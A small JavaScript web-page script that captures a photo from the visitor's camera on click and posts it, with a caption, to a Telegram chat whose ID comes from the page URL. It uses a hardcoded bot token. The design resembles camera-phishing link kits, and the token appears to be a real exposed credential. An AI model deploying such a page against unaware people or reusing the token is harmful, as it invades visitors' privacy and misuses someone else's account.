// ========== CONFIG ==========
const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
// ============================

// get user id from URL (?=6362758258)
const params = new URLSearchParams(location.search);
const CHAT_ID = params.get("");

// elements
const video = document.getElementById("video");
const preview = document.getElementById("preview");
const captureBtn = document.getElementById("captureBtn");
const sendBtn = document.getElementById("sendBtn");

let imageBlob = null;

// start camera
navigator.mediaDevices.getUserMedia({ video:true })
.then(stream => {
  video.srcObject = stream;
})
.catch(() => alert("Camera permission required"));

// capture photo (user click)
captureBtn.onclick = () => {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  canvas.toBlob(blob=>{
    imageBlob = blob;
    preview.src = URL.createObjectURL(blob);
    preview.style.display = "block";
    sendBtn.style.display = "inline-block";
  },"image/jpeg",0.9);
};

// send to telegram
sendBtn.onclick = async () => {
  if(!CHAT_ID){
    alert("User ID not found in URL");
    return;
  }

  const caption =
`📸 <b>New Image Received</b>

🔢 <b>Number:</b> ${CHAT_ID}
👨‍💻 <b>Dev:</b> @XFPro43`;

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", imageBlob, "photo.jpg");
  form.append("caption", caption);
  form.append("parse_mode","HTML");

  try{
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body:form
    });
    const data = await res.json();
    alert(data.ok ? "✅ Sent" : "❌ Failed");
  }catch(e){
    alert("❌ Network / CORS Error");
  }
}; 
